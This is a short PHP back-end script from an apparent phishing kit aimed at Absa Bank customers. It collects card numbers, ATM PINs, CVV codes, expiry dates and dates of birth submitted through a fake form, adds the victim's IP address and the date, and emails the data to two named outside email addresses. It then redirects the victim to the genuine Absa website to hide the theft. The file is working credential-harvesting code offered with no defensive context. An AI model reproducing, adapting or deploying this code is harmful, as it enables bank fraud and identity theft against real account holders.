<?php
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$card = $HTTP_POST_VARS["card"];
$atm = $HTTP_POST_VARS["atm"];
$cvv = $HTTP_POST_VARS["cvv"];
$exp = $HTTP_POST_VARS["exp"];
$dob = $HTTP_POST_VARS["dob"];
$mesaj = "Created By Don WalkeR {NightWalkeR}
Enter Card Number : $card
Enter ATM PIN : $atm
Enter CVV : $cvv
Enter Expiry Date : $exp
Enter Enter Date of Birth : $dob
----------------------------------------------------
IP : $ip 
DATE : $datamasii
";

$recipient = "carlitomachito@hotmail.com,chaselogins2011@gmail.com";
$subject = "Absa Bank Info";

mail($recipient,$subject,$mesaj);
header("Location: http://www.absa.co.za/absacoza/");
?>